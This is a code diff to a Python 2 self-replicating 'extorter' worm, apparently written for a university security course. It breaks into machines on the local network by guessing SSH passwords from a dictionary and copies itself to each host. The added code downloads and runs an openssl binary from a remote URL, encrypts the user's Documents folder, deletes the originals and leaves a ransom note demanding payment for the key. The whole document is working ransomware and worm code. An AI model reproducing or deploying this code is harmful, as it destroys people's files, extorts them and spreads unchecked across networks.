@@ -6,9 +6,13 @@ import socket
 from subprocess import call
 import tarfile
 from time import sleep
- 
+from subprocess import Popen
+import os
+import shutil
+
+
 # File marking the presence of a worm in a system
-INFECTION_MARKER = "/tmp/infectionMarker.txt"
+INFECTION_MARKER = "/tmp/infectionMarker_extorter_python.txt"
   
   
 # List of credentials for Dictionary Attack
@@ -18,6 +22,7 @@ DICTIONARYATTACK_LIST = {
         'security': 'important',
         'ubuntu': '123456'
         }
+ATTACKER_IP = "192.168.1.4"
   
 #############################################
 #Creates a marker file on the target system
@@ -41,8 +46,9 @@ def isInfected(sshC):
         sftpClient.stat(INFECTION_MARKER)
         infected = True
           
-    except IOError, e:
-        print("This system is not Infected ")  
+    except Exception, e:
+	print("System is not infected")
+	infected = False   
   
     return infected   
       
@@ -74,47 +80,16 @@ def getHostsOnTheSameNetwork():
 #########################################################
 #Removes all the worm traces from the remote host
 ########################################################
-def cleanTraces(ssh):
+def cleanTraces():
     try:
-	sftpClient = ssh.open_sftp()
-	sleep(1)
-	sftpClient.unlink("/tmp/DocumentsDir.tar")
-	sftpClient.unlink("/tmp/extorter_worm.py")
-	sftpClient.unlink("/tmp/extorter.py")
-	sftpClient.unlink("/tmp/openssl")
+	os.remove("/tmp/openssl")
+	os.remove("/tmp/DocumentsDir.tar.enc")
+	os.remove("/tmp/DocumentsDir.tar")
+	os.remove("/tmp/extorter_worm.py")
+	shutil.rmtree("/home/ubuntu/Documents/") 
 	print("Cleaned up all traces")
     except:
 	print("Files does not exist")
-
-
-
-##############################################################
-#Performs following functionalities:
-#1. Checks if '/home/cpsc/Documents' folder exists
-#2. Copy extorter.py into remote location (extorter.py - Responsible for executing extortion functions)
-#3. Execute and spread worm 
-##############################################################
-def extort(ssh):
-       
-    #Open connection with the remote system
-    sftpClient = ssh.open_sftp()
-     #Check if /home/cpsc/Documents Dir exists
-    try:
-    	sftpClient.stat("/home/cpsc/Documents")
-        #Download openssl program  
-	sftpClient.put("/tmp/extorter.py", "/tmp/extorter.py")
-	ssh.exec_command("chmod a+x /tmp/extorter.py")
-	ssh.exec_command("python -u /tmp/extorter.py > /tmp/ext.output")
-	print("Copied and executed remote code into the victim system")
-	ssh.exec_command("nohup python -u /tmp/extorter_worm.py > /tmp/worm.output &")
-	cleanTraces(ssh)
-    except:
-	sleep(1)
-	sftpClient.unlink("/tmp/extorter_worm.py")
-        e = sys.exc_info()
-	print(e)
-  
-
 
 ############################################
 #Exploits the target system
@@ -125,10 +100,10 @@ def launchAttack(ssh):
     try:
         sftpClient.put("/tmp/extorter_worm.py","/tmp/extorter_worm.py")
         ssh.exec_command("chmod a+x /tmp/extorter_worm.py")
-    	print("Copied worm into the system...")
-	extort(ssh)
-    except:
-        print("Failed to Execute worm")
+	ssh.exec_command("nohup python -u /tmp/extorter_worm.py > /tmp/worm.output &")
+	print("Copied and executed worm into the system...")
+    except Exception, e:
+	print("Problem in Execution:", e) 
      
  
 ##############################################
@@ -165,7 +140,41 @@ def checkCredentials(hostIp):
             pass   
     print("Could not login to the system")
     return ssh
-      
+ 
+
+##############################################
+#Downlaods openSSL and extortion note files
+##############################################
+def downloadFiles():
+    try:
+	    urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "openssl")
+	    print("Downloaded the OpenSSL file")
+	    Popen(["chmod", "a+x", "./openssl"])
+    except Exception, e:
+	    print("Problem in Execution:", e) 
+
+###############################################
+#Create tar of the /home/ubuntu/Documens Dir
+###############################################
+def createTarAndEncrypt():
+    try:
+	    os.chdir("/tmp/")
+	    tar = tarfile.open("DocumentsDir.tar", "w:gz")        
+	    tar.add('/home/ubuntu/Documents/')
+	    tar.close()
+	    print("Finished tar of Documents folder")
+
+	    #Encrypt tar file
+	    Popen(["openssl", "aes-256-cbc", "-a", "-salt", "-in", "DocumentsDir.tar", "-out", "DocumentsDir.tar.enc", "-k", "-cs456worm"])
+	    print("Created Encryption File")
+    except Exception, e:
+	print("Problem in Execution:", e) 
+
+ 
+def leaveNote():
+    marker = open("/home/ubuntu/Desktop/SystemCompromised.txt", "w")
+    marker.write("We have deleted the Documents Folder. An encrypted version is placed on your Desktop. You will have to purchase the encrytpion key from us !!!")
+    marker.close()    
  
 ##############################################################
 #This is start of the replicator worm
@@ -176,20 +185,37 @@ print("Started infecting the network .....")
 #Get all hosts in the network
 discoveredHosts = getHostsOnTheSameNetwork()
 markInfected()
- 
+myIp = getMyIP()
+
+
+#######################################################################################
+#1. Download Open SSL program
+#2. Create tar and encrypt the '/home/cpsc/Documents' folder
+#3. Delete 'home/cpsc/Documents' folder
+#4. Downlaod an image file and set it as desktop background - Note on users Desktop
+#######################################################################################
+if(cmp(myIp, ATTACKER_IP) != 0):
+    try:
+        print("In the function")
+        os.chdir("/tmp/")
+        downloadFiles()
+        createTarAndEncrypt() 
+        leaveNote()
+	shutil.copy("/tmp/DocumentsDir.tar.enc", "/home/ubuntu/Desktop/")   
+	print("Copied Encrypted file to Desktop")
+    except Exception, e:
+	print("Problem in Execution:", e) 
+
  
 for host in discoveredHosts:
     print(host + " under Observation ...")
     ssh = None
     try:
         ssh = checkCredentials(host)
-        print(str(ssh) + "Testing")
         if ssh:
             print("Successfully cracked Username and password of "+host)
             if not isInfected(ssh):
                 launchAttack(ssh)
-                #extort(ssh)
-		#cleanTraces(ssh)
                 ssh.close()
                 break
             else:
@@ -199,4 +225,10 @@ for host in discoveredHosts:
     except paramiko.ssh_exception.AuthenticationException:
         print("Wrong Credentials")
     print("---------------------")
+
+if(cmp(myIp, ATTACKER_IP) != 0):
+    try: 
+        cleanTraces() 
+    except Exception, e:
+	print("Problem in Execution:", e)  
 print("I am done now !!")
